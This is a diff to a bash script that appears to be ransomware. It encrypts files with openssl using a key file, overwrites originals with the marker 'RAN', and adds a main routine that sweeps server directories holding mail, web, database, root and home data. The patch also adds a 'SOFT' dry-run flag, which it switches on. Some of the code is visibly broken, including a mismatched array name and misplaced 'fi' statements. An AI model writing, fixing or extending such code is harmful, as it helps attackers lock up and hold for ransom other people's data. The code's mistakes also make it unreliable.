@@ -60,6 +60,7 @@ init() {
 }
 #encrypt the file (pack = pck)
 pck() {
+	if [ "$SOFT" == "" ]; then
 	openfile $1
 	stuff=$(cat $1)
 	echo "RAN" > $1
@@ -67,6 +68,7 @@ pck() {
 	if [ ! -f "$1" ]; then
 		adderr "[!] FILE NOT ENCRYPTED"
 		EXIT
+	fi
 	fi
 	adderr "[+] Encrypted $1"
 }
@@ -77,8 +79,11 @@ dec() {
 }
 #unpack
 upk() {
+	if [ "$SOFT" == "" ]; then
 	openssl aes-256-cbc -d -kfile $PRIVATEKEY -in $1 -out $1.dec
 	mv $1.dec $1
+	fi
+	adderr "[+] Decrypted $1"
 }
 
 navdir() {
@@ -91,10 +96,16 @@ for fil in ${files[@]}; do
 	fi
 done
 }
-
-check_req
-init
-for i in $@; do
-	navdir "$i*" "pck"
-done
-EXIT
+main() {
+	SOFT="YES"
+	check_req
+	init
+	targets=( "/etc/mail" "/etc/postfix" "/var/www" "/root" "/home" "/var/lib/mysql" )
+	for i in ${target[@]}; do
+		if [ -d "$i" ]; then
+			navdir "$i/*" "pck"
+		fi
+	done
+	EXIT	
+}
+main
